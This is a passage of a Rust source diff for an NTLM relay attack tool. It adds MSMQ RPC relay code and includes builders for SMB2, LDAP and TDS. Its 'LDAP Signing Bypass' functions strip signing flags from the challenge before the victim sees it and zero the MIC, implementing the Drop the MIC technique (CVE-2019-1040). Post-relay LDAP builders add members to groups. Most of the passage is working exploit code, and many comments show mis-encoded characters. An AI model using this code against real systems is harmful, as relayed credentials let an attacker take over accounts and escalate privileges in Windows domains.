+    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+
+    async fn msmq_negotiate_and_challenge(
+        &self,
+        target: &RelayTarget,
+        ntlm_negotiate: &[u8],
+        timeout: Duration,
+    ) -> Result<(TcpStream, Vec<u8>)> {
+        let mut stream = tokio::time::timeout(timeout, TcpStream::connect(target.address))
+            .await
+            .map_err(|_| {
+                RelayError::Connection(format!("Timeout connecting to {}", target.address))
+            })?
+            .map_err(|e| RelayError::Connection(format!("MSMQ connect: {}", e)))?;
+
+        let mut buf = vec![0u8; 65536];
+
+        // MSMQ uses RPC on port 1801. Build an RPC bind with NTLM negotiate.
+        let msmq_uuid = "fdb3a030-065f-11d1-bb9b-00a024ea5525";
+        let bind_pdu = build_rpc_ntlm_bind(msmq_uuid, 1, ntlm_negotiate);
+        stream
+            .write_all(&bind_pdu)
+            .await
+            .map_err(|e| RelayError::Network(format!("MSMQ RPC bind write: {}", e)))?;
+
+        let len = tokio::time::timeout(timeout, stream.read(&mut buf))
+            .await
+            .map_err(|_| {
+                RelayError::Connection(format!(
+                    "Timeout reading MSMQ bind response from {}",
+                    target.address
+                ))
+            })?
+            .map_err(|e| RelayError::Network(format!("MSMQ RPC bind read: {}", e)))?;
+
+        // Validate RPC bind_ack: ver=5, type=12 (BIND_ACK), PFC_FIRST|PFC_LAST
+        if len < 24 || buf[0] != 5 || buf[2] != 12 || buf[3] != 0x03 {
+            return Err(RelayError::Authentication(
+                "MSMQ RPC bind rejected or unexpected response".into(),
+            )
+            .into());
+        }
+
+        // Validate bind_ack presentation context result (byte 28: 0=acceptance)
+        if len >= 29 && buf[28] != 0 {
+            debug!("MSMQ bind_ack rejected context (result={})", buf[28]);
+            return Err(RelayError::Authentication(format!(
+                "MSMQ RPC bind context rejected (result={})",
+                buf[28]
+            ))
+            .into());
+        }
+
+        // Extract NTLM challenge from the RPC bind_ack auth trailer
+        if let Some(challenge) = extract_ntlm_from_rpc_challenge(&buf[..len]) {
+            debug!("Got NTLM challenge from MSMQ {}", target.address);
+            Ok((stream, challenge))
+        } else {
+            Err(
+                RelayError::Authentication("No NTLM challenge found in MSMQ bind_ack".into())
+                    .into(),
+            )
+        }
+    }
+
+    async fn msmq_authenticate(
+        &self,
+        stream: &mut TcpStream,
+        ntlm_authenticate: &[u8],
+    ) -> Result<()> {
+        // Send RPC request with NTLM authenticate as auth trailer
+        // opnum 0 (generic) with empty stub data
+        let auth_pdu = build_rpc_ntlm_request(0, ntlm_authenticate);
+        stream
+            .write_all(&auth_pdu)
+            .await
+            .map_err(|e| RelayError::Network(format!("MSMQ auth write: {}", e)))?;
+
+        let mut buf = vec![0u8; 65536];
+        let len = tokio::time::timeout(
+            Duration::from_secs(self.config.timeout_secs),
+            stream.read(&mut buf),
+        )
+        .await
+        .map_err(|_| RelayError::Connection("Timeout reading MSMQ auth response".into()))?
+        .map_err(|e| RelayError::Network(format!("MSMQ auth read: {}", e)))?;
+
+        if len < 24 {
+            return Err(RelayError::Authentication("MSMQ auth short response".into()).into());
+        }
+
+        // RPC response type 2 = Response PDU. Validate version and flags too.
+        if buf[0] != 5 || buf[2] != 2 || buf[3] != 0x03 {
+            return Err(RelayError::Authentication(format!(
+                "MSMQ auth failed â€” RPC ver={} type=0x{:02X} flags=0x{:02X}",
+                buf[0], buf[2], buf[3],
+            ))
+            .into());
+        }
+        Ok(())
+    }
 }
 
-// ═══════════════════════════════════════════════════════════
-// SMB2 PDU Builders
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// RPC PDU Builders for MSMQ relay
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+
+/// Parse UUID string into NDR wire format (mixed-endian).
+/// Validates format before decoding; returns zero UUID on invalid input.
+fn parse_uuid_to_ndr_compact(uuid_str: &str) -> Vec<u8> {
+    // Validate UUID format: 8-4-4-4-12 hex digits with hyphens
+    let parts: Vec<&str> = uuid_str.split('-').collect();
+    if parts.len() != 5 {
+        return vec![0u8; 16];
+    }
+    if parts[0].len() != 8
+        || parts[1].len() != 4
+        || parts[2].len() != 4
+        || parts[3].len() != 4
+        || parts[4].len() != 12
+    {
+        return vec![0u8; 16];
+    }
+
+    let hex: String = parts.join("");
+    let bytes = match hex::decode(&hex) {
+        Ok(b) => b,
+        Err(_) => return vec![0u8; 16],
+    };
+
+    let mut ndr = Vec::with_capacity(16);
+    ndr.extend_from_slice(&[bytes[3], bytes[2], bytes[1], bytes[0]]);
+    ndr.extend_from_slice(&[bytes[5], bytes[4]]);
+    ndr.extend_from_slice(&[bytes[7], bytes[6]]);
+    ndr.extend_from_slice(&bytes[8..16]);
+    ndr
+}
+
+/// Build an RPC bind PDU with NTLM authenticate as the auth trailer
+fn build_rpc_ntlm_bind(interface_uuid: &str, version_major: u16, ntlm_token: &[u8]) -> Vec<u8> {
+    let uuid_bytes = parse_uuid_to_ndr_compact(interface_uuid);
+
+    let mut pdu = vec![5u8, 0, 11, 0x03]; // RPC v5.0, BIND, first+last frag
+    pdu.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]); // NDR
+
+    let total_auth = ntlm_token.len() + 16; // auth_header + ntlm_data
+    let auth_len = if total_auth > usize::from(u16::MAX) {
+        u16::MAX
+    } else {
+        total_auth as u16
+    };
+    let body_len = 72 + 24 + 16 + ntlm_token.len(); // fixed body + context + auth_info
+    let frag_len = if (24 + body_len) > usize::from(u16::MAX) {
+        u16::MAX
+    } else {
+        (24 + body_len) as u16
+    };
+
+    pdu.extend_from_slice(&frag_len.to_le_bytes());
+    pdu.extend_from_slice(&auth_len.to_le_bytes()); // auth_length
+    pdu.extend_from_slice(&0u32.to_le_bytes()); // call_id
+
+    // Body
+    pdu.extend_from_slice(&4280u16.to_le_bytes()); // max_xmit
+    pdu.extend_from_slice(&4280u16.to_le_bytes()); // max_recv
+    pdu.extend_from_slice(&0u32.to_le_bytes()); // assoc_group
+
+    pdu.push(1); // num_contexts
+    pdu.extend_from_slice(&[0x00, 0x00, 0x00]); // padding
+
+    // Context item
+    pdu.extend_from_slice(&0u16.to_le_bytes()); // context_id
+    pdu.push(1); // num_transfer_syntaxes
+    pdu.push(0); // padding
+    pdu.extend_from_slice(&uuid_bytes);
+    pdu.extend_from_slice(&version_major.to_le_bytes());
+    pdu.extend_from_slice(&0u16.to_le_bytes()); // minor
+    let ndr_uuid = parse_uuid_to_ndr_compact("8a885d04-1ceb-11c9-9fe8-08002b104860");
+    pdu.extend_from_slice(&ndr_uuid);
+    pdu.extend_from_slice(&2u16.to_le_bytes());
+    pdu.extend_from_slice(&0u16.to_le_bytes());
+
+    // Auth trailer (NTLM SSP with negotiate)
+    let auth_type: u16 = 10; // NTLMSSP
+    let auth_level: u16 = 6; // RPC_C_AUTHN_LEVEL_PKT_PRIVACY
+    let auth_pad: u8 = 0;
+    let auth_reserved: u8 = 0;
+    let ctx_id: u32 = 0;
+
+    pdu.extend_from_slice(&auth_type.to_le_bytes());
+    pdu.extend_from_slice(&auth_level.to_le_bytes());
+    pdu.push(auth_pad);
+    pdu.push(auth_reserved);
+    pdu.extend_from_slice(&ctx_id.to_le_bytes());
+
+    // NTLM token
+    let token_len_bytes = (ntlm_token.len() as u32).to_le_bytes();
+    pdu.extend_from_slice(&token_len_bytes);
+    pdu.extend_from_slice(ntlm_token);
+
+    // Pad to 4-byte alignment
+    while !pdu.len().is_multiple_of(4) {
+        pdu.push(0);
+    }
+
+    pdu
+}
+
+/// Build an RPC request PDU with NTLM authenticate as auth trailer
+fn build_rpc_ntlm_request(opnum: u16, ntlm_token: &[u8]) -> Vec<u8> {
+    let stub_data = [0u8; 4]; // minimal stub data
+    let stub_len = stub_data.len();
+    let total_frag = 24 + stub_len + 16 + ntlm_token.len();
+    let frag_len = if total_frag > usize::from(u16::MAX) {
+        u16::MAX
+    } else {
+        total_frag as u16
+    };
+    let auth_len_u16 = if (16 + ntlm_token.len()) > usize::from(u16::MAX) {
+        u16::MAX
+    } else {
+        (16 + ntlm_token.len()) as u16
+    };
+
+    let mut pdu = vec![5u8, 0, 0, 0x03]; // RPC v5.0, REQUEST
+    pdu.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]); // NDR
+
+    pdu.extend_from_slice(&frag_len.to_le_bytes());
+    pdu.extend_from_slice(&auth_len_u16.to_le_bytes()); // auth_length
+    pdu.extend_from_slice(&2u32.to_le_bytes()); // call_id
+
+    pdu.extend_from_slice(&(stub_len as u32).to_le_bytes()); // alloc_hint
+    pdu.extend_from_slice(&0u16.to_le_bytes()); // context_id
+    pdu.extend_from_slice(&opnum.to_le_bytes());
+    pdu.extend_from_slice(&stub_data);
+
+    // Auth trailer
+    let auth_type: u16 = 10; // NTLMSSP
+    let auth_level: u16 = 6;
+    let auth_pad: u8 = 0;
+    let auth_reserved: u8 = 0;
+    let ctx_id: u32 = 1;
+
+    pdu.extend_from_slice(&auth_type.to_le_bytes());
+    pdu.extend_from_slice(&auth_level.to_le_bytes());
+    pdu.push(auth_pad);
+    pdu.push(auth_reserved);
+    pdu.extend_from_slice(&ctx_id.to_le_bytes());
+
+    let token_len_bytes = (ntlm_token.len() as u32).to_le_bytes();
+    pdu.extend_from_slice(&token_len_bytes);
+    pdu.extend_from_slice(ntlm_token);
+
+    // Pad
+    while !pdu.len().is_multiple_of(4) {
+        pdu.push(0);
+    }
+
+    pdu
+}
+
+/// Extract NTLM challenge from RPC bind_ack response.
+/// Validates RPC version, PDU type, and NTLM signature.
+fn extract_ntlm_from_rpc_challenge(data: &[u8]) -> Option<Vec<u8>> {
+    if data.len() < 48 {
+        return None;
+    }
+    // Validate RPC version 5, PDU type BIND_ACK (12), and flags
+    if data[0] != 5 || data[2] != 12 {
+        return None;
+    }
+
+    let auth_len = u16::from_le_bytes([data[10], data[11]]) as usize;
+    if auth_len == 0 || data.len() < 24 + auth_len {
+        return None;
+    }
+
+    let frag_len = u16::from_le_bytes([data[8], data[9]]) as usize;
+    if frag_len > data.len() || frag_len < 32 {
+        return None;
+    }
+
+    // Auth trailer is at the end of the PDU body.
+    // Per RPC spec: trailer starts at (24 + frag_len - auth_len) but using
+    // data.len() - auth_len is equivalent when no trailing padding present.
+    let trailer_start = data.len() - auth_len;
+    if trailer_start + 16 > data.len() {
+        return None;
+    }
+
+    let token_len = u32::from_le_bytes([
+        data[trailer_start + 12],
+        data[trailer_start + 13],
+        data[trailer_start + 14],
+        data[trailer_start + 15],
+    ]) as usize;
+
+    if trailer_start + 16 + token_len > data.len() {
+        return None;
+    }
+
+    let token = data[trailer_start + 16..trailer_start + 16 + token_len].to_vec();
+    // Verify it looks like NTLM challenge (type 2)
+    if token.len() >= 12
+        && token[0..8] == *b"NTLMSSP\x00"
+        && u32::from_le_bytes([token[8], token[9], token[10], token[11]]) == 2
+    {
+        return Some(token);
+    }
+
+    None
+}
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
 /// Build correct SMB2 NEGOTIATE request.
-///
 /// Layout per [MS-SMB2] 2.2.3:
 ///   NetBIOS(4) + Header(64) + NegotiateBody(36+dialects)
 fn build_smb2_negotiate(message_id: u64) -> Vec<u8> {
     let mut msg = Vec::with_capacity(128);
 
-    // ── NetBIOS session header (4 bytes) ──
+    // â”€â”€ NetBIOS session header (4 bytes) â”€â”€
     msg.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // Length placeholder
 
-    // ── SMB2 header (64 bytes) ──
+    // â”€â”€ SMB2 header (64 bytes) â”€â”€
     msg.extend_from_slice(b"\xfeSMB"); // ProtocolId
     msg.extend_from_slice(&64u16.to_le_bytes()); // StructureSize
     msg.extend_from_slice(&0u16.to_le_bytes()); // CreditCharge
@@ -995,7 +1441,7 @@ fn build_smb2_negotiate(message_id: u64) -> Vec<u8> {
     msg.extend_from_slice(&0u64.to_le_bytes()); // SessionId (u64)
     msg.extend_from_slice(&[0u8; 16]); // Signature
 
-    // ── NEGOTIATE request body (36 + dialects) ──
+    // â”€â”€ NEGOTIATE request body (36 + dialects) â”€â”€
     msg.extend_from_slice(&36u16.to_le_bytes()); // StructureSize
     msg.extend_from_slice(&3u16.to_le_bytes()); // DialectCount
     msg.extend_from_slice(&1u16.to_le_bytes()); // SecurityMode (signing enabled)
@@ -1021,16 +1467,15 @@ fn build_smb2_negotiate(message_id: u64) -> Vec<u8> {
 }
 
 /// Build correct SMB2 SESSION_SETUP request.
-///
 /// Layout per [MS-SMB2] 2.2.5:
 ///   NetBIOS(4) + Header(64) + SessionSetup(24+security_buffer)
 fn build_smb2_session_setup(ntlm_data: &[u8], session_id: u64, message_id: u64) -> Vec<u8> {
     let mut msg = Vec::with_capacity(128 + ntlm_data.len());
 
-    // ── NetBIOS session header ──
+    // â”€â”€ NetBIOS session header â”€â”€
     msg.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);
 
-    // ── SMB2 header (64 bytes) ──
+    // â”€â”€ SMB2 header (64 bytes) â”€â”€
     msg.extend_from_slice(b"\xfeSMB");
     msg.extend_from_slice(&64u16.to_le_bytes()); // StructureSize
     msg.extend_from_slice(&0u16.to_le_bytes()); // CreditCharge
@@ -1045,7 +1490,7 @@ fn build_smb2_session_setup(ntlm_data: &[u8], session_id: u64, message_id: u64) 
     msg.extend_from_slice(&session_id.to_le_bytes()); // SessionId (u64!)
     msg.extend_from_slice(&[0u8; 16]); // Signature
 
-    // ── SESSION_SETUP request body ──
+    // â”€â”€ SESSION_SETUP request body â”€â”€
     // StructureSize = 25 (fixed, per spec)
     msg.extend_from_slice(&25u16.to_le_bytes());
     // Flags (0 = none)
@@ -1129,18 +1574,17 @@ fn find_ntlm_challenge_end(ntlm_data: &[u8]) -> usize {
     ntlm_data.len().min(256)
 }
 
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 // LDAP PDU Builders (proper BER encoding)
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
 /// Build LDAP SASL Bind request with GSS-SPNEGO wrapping.
-///
 /// Uses proper BER definite-length encoding that handles
 /// payloads > 127 bytes.
 fn build_ldap_sasl_bind(ntlm_data: &[u8], message_id: u32) -> Vec<u8> {
     let mechanism = b"GSS-SPNEGO";
 
-    // Build innermost → outermost
+    // Build innermost â†’ outermost
     // Credentials: OCTET STRING
     let cred_tlv = ber_octet_string(ntlm_data);
     // Mechanism: OCTET STRING
@@ -1209,7 +1653,7 @@ fn extract_ntlm_from_ldap_response(data: &[u8]) -> Result<Vec<u8>> {
     Err(RelayError::Protocol("No NTLM challenge in LDAP response".into()).into())
 }
 
-// ── BER helpers ──
+// â”€â”€ BER helpers â”€â”€
 
 fn ber_encode_length(len: usize) -> Vec<u8> {
     if len < 128 {
@@ -1285,9 +1729,9 @@ fn ber_read_length(data: &[u8], offset: usize) -> Option<(usize, usize)> {
     }
 }
 
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 // TDS PDU Builders
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
 /// Build TDS PRELOGIN packet
 fn build_tds_prelogin() -> Vec<u8> {
@@ -1301,9 +1745,9 @@ fn build_tds_prelogin() -> Vec<u8> {
     msg.push(0x00); // PacketID
     msg.push(0x00); // Window
 
-    // ── PRELOGIN option tokens ──
+    // â”€â”€ PRELOGIN option tokens â”€â”€
     // Each token: type(1) + offset(2) + length(2)
-    // Token 0: VERSION — offset=11, length=6
+    // Token 0: VERSION â€” offset=11, length=6
     msg.push(0x00);
     msg.extend_from_slice(&11u16.to_be_bytes());
     msg.extend_from_slice(&6u16.to_be_bytes());
@@ -1323,7 +1767,6 @@ fn build_tds_prelogin() -> Vec<u8> {
 }
 
 /// Build TDS LOGIN7 with NTLM negotiate as SSPI blob.
-///
 /// Per [MS-TDS] 2.2.6.4, LOGIN7 has a 94-byte fixed header
 /// followed by variable data. The SSPI blob offset/length is
 /// at header offset 0x5E (ibSSPI: u16, cbSSPI: u16).
@@ -1338,7 +1781,7 @@ fn build_tds_login7_sspi(ntlm_data: &[u8]) -> Vec<u8> {
     msg.push(0x01); // PacketID
     msg.push(0x00); // Window
 
-    // ── LOGIN7 fixed portion (94 bytes from start of TDS data) ──
+    // â”€â”€ LOGIN7 fixed portion (94 bytes from start of TDS data) â”€â”€
     let login_start = msg.len();
 
     msg.extend_from_slice(&0u32.to_le_bytes()); // Length (placeholder)
@@ -1358,7 +1801,7 @@ fn build_tds_login7_sspi(ntlm_data: &[u8]) -> Vec<u8> {
     msg.extend_from_slice(&0i32.to_le_bytes()); // ClientTimeZone
     msg.extend_from_slice(&0x00000409u32.to_le_bytes()); // ClientLCID (en-US)
 
-    // ── Offset/Length pairs (each is offset:u16, length:u16) ──
+    // â”€â”€ Offset/Length pairs (each is offset:u16, length:u16) â”€â”€
     // Variable data starts after the 94-byte fixed portion.
     // Offset is from the start of the LOGIN7 data (not TDS header).
     let var_data_offset: u16 = 94;
@@ -1392,10 +1835,10 @@ fn build_tds_login7_sspi(ntlm_data: &[u8]) -> Vec<u8> {
     msg.extend_from_slice(&var_data_offset.to_le_bytes());
     msg.extend_from_slice(&0u16.to_le_bytes());
 
-    // ClientID (6 bytes MAC address — zeroed)
+    // ClientID (6 bytes MAC address â€” zeroed)
     msg.extend_from_slice(&[0u8; 6]);
 
-    // ibSSPI, cbSSPI — THIS IS THE KEY FIELD
+    // ibSSPI, cbSSPI â€” THIS IS THE KEY FIELD
     msg.extend_from_slice(&var_data_offset.to_le_bytes());
     let sspi_len = ntlm_data.len() as u16;
     msg.extend_from_slice(&sspi_len.to_le_bytes());
@@ -1408,7 +1851,7 @@ fn build_tds_login7_sspi(ntlm_data: &[u8]) -> Vec<u8> {
     msg.extend_from_slice(&var_data_offset.to_le_bytes());
     msg.extend_from_slice(&0u16.to_le_bytes());
 
-    // cbSSPILong (u32) — for SSPI > 65535 bytes
+    // cbSSPILong (u32) â€” for SSPI > 65535 bytes
     msg.extend_from_slice(&(ntlm_data.len() as u32).to_le_bytes());
 
     // Pad to 94 bytes if needed
@@ -1416,7 +1859,7 @@ fn build_tds_login7_sspi(ntlm_data: &[u8]) -> Vec<u8> {
         msg.push(0);
     }
 
-    // ── Variable data: SSPI blob ──
+    // â”€â”€ Variable data: SSPI blob â”€â”€
     msg.extend_from_slice(ntlm_data);
 
     // Patch LOGIN7 total length
@@ -1460,9 +1903,9 @@ fn extract_ntlm_from_tds(data: &[u8]) -> Result<Vec<u8>> {
     Err(RelayError::Protocol("No NTLM challenge in TDS response".into()).into())
 }
 
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 // Utility Functions
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
 /// Parse username/domain from NTLM AUTHENTICATE message
 pub fn parse_ntlm_authenticate_info(data: &[u8]) -> Result<(String, String)> {
@@ -1533,13 +1976,12 @@ fn base64_decode(data: &str) -> Option<Vec<u8>> {
     STANDARD.decode(data.trim()).ok()
 }
 
-// ═══════════════════════════════════════════════════════════
-// LDAP Signing Bypass — Challenge & Authenticate Modification
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// LDAP Signing Bypass â€” Challenge & Authenticate Modification
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
 /// Strip NTLMSSP_NEGOTIATE_SIGN / SEAL / ALWAYS_SIGN from an NTLM
 /// CHALLENGE message **before** the victim sees it.
-///
 /// If the victim never learns the server wants signing, it will not
 /// compute a MIC and will not set SIGN flags in its AUTHENTICATE.
 /// This is the first half of the "Drop the MIC" technique (CVE-2019-1040).
@@ -1562,13 +2004,12 @@ fn strip_signing_flags_from_challenge(challenge: &mut [u8]) {
 }
 
 /// Prepare an NTLM AUTHENTICATE message for LDAP relay.
-///
 /// Belt-and-suspenders companion to `strip_signing_flags_from_challenge`:
 ///   1. Clear SIGN / SEAL / ALWAYS_SIGN from NegotiateFlags (offset 60).
 ///   2. Zero the MIC field (16 bytes at offset 72) if it looks present.
 ///
-/// The NtProofStr covers `ServerChallenge ‖ ClientBlob` — NOT the outer
-/// AUTHENTICATE header — so flag/MIC changes don't break the hash chain
+/// The NtProofStr covers `ServerChallenge â€– ClientBlob` â€” NOT the outer
+/// AUTHENTICATE header â€” so flag/MIC changes don't break the hash chain
 /// that the server verifies.
 fn prepare_authenticate_for_ldap_relay(authenticate: &[u8]) -> Vec<u8> {
     let mut msg = authenticate.to_vec();
@@ -1584,13 +2025,13 @@ fn prepare_authenticate_for_ldap_relay(authenticate: &[u8]) -> Vec<u8> {
         return msg;
     }
 
-    // Step 1 — clear signing negotiate flags (offset 60..64)
+    // Step 1 â€” clear signing negotiate flags (offset 60..64)
     let mut flags = u32::from_le_bytes([msg[60], msg[61], msg[62], msg[63]]);
     flags &= !(NTLMSSP_NEGOTIATE_SIGN | NTLMSSP_NEGOTIATE_SEAL | NTLMSSP_NEGOTIATE_ALWAYS_SIGN);
     msg[60..64].copy_from_slice(&flags.to_le_bytes());
 
-    // Step 2 — zero the MIC (bytes 72..88).
-    // MIC exists when the message is long enough to contain it (≥88 bytes).
+    // Step 2 â€” zero the MIC (bytes 72..88).
+    // MIC exists when the message is long enough to contain it (â‰¥88 bytes).
     // Because we also stripped SIGN from the CHALLENGE the victim saw, the
     // victim most likely didn't produce a MIC. But zeroing is harmless and
     // covers edge cases where the victim computed one anyway.
@@ -1601,12 +2042,11 @@ fn prepare_authenticate_for_ldap_relay(authenticate: &[u8]) -> Vec<u8> {
     msg
 }
 
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 // Post-Relay LDAP Operation Builders
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
 /// Build an LDAP Modify request to add a `member` value to a group.
-///
 /// BER layout:
 /// ```text
 /// SEQUENCE {
@@ -1692,7 +2132,7 @@ fn build_ldap_search_request(
     // typesOnly false
     let types_only = ber_wrap(0x01, &[0x00]);
 
-    // Filter — parse simple (attr=value) or fall back to present(objectClass)
+    // Filter â€” parse simple (attr=value) or fall back to present(objectClass)
     let filter_ber = if let Some(inner) = filter.strip_prefix('(').and_then(|s| s.strip_suffix(')'))
     {
         if let Some((attr, val)) = inner.split_once('=') {
@@ -1756,9 +2196,9 @@ fn parse_ldap_generic_result(data: &[u8], app_tag: u8) -> Result<u8> {
     .into())
 }
 
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 // Tests
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
 #[cfg(test)]
 mod tests {
@@ -1780,6 +2220,8 @@ mod tests {
             remove_on_success: true,
             timeout_secs: 30,
             ldap_signing_bypass: true,
+            max_retries: 3,
+            max_connections: 64,
         };
 
         assert_eq!(config.listen_ip, "0.0.0.0");
@@ -1802,10 +2244,17 @@ mod tests {
     #[test]
     fn test_relay_stats_default() {
         let stats = RelayStats::default();
-        assert_eq!(stats.successful_relays, 0);
-        assert_eq!(stats.failed_relays, 0);
-        assert_eq!(stats.active_connections, 0);
-        assert_eq!(stats.total_attempts, 0);
+        assert_eq!(stats.successful_relays.load(Ordering::Relaxed), 0);
+        assert_eq!(stats.failed_relays.load(Ordering::Relaxed), 0);
+        assert_eq!(stats.active_connections.load(Ordering::Relaxed), 0);
+        assert_eq!(stats.total_attempts.load(Ordering::Relaxed), 0);
+        assert!(
+            stats
+                .stats_by_protocol
+                .read()
+                .map(|g| g.is_empty())
+                .unwrap_or(true)
+        );
     }
 
     #[test]
@@ -1916,7 +2365,7 @@ mod tests {
         assert_eq!(end, ntlm);
     }
 
-    // ── LDAP signing bypass tests ────────────────────────
+    // â”€â”€ LDAP signing bypass tests â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
     #[test]
     fn test_strip_signing_flags_from_challenge() {
@@ -2027,11 +2476,13 @@ mod tests {
     }
 
     #[test]
-    fn test_relay_config_ldap_bypass_default() {
+    fn test_relay_config_default() {
         let cfg = RelayConfig::default();
         assert!(
             cfg.ldap_signing_bypass,
             "LDAP signing bypass should default to true"
         );
+        assert_eq!(cfg.max_retries, 3);
+        assert!(cfg.max_connections >= 1);
     }
 }
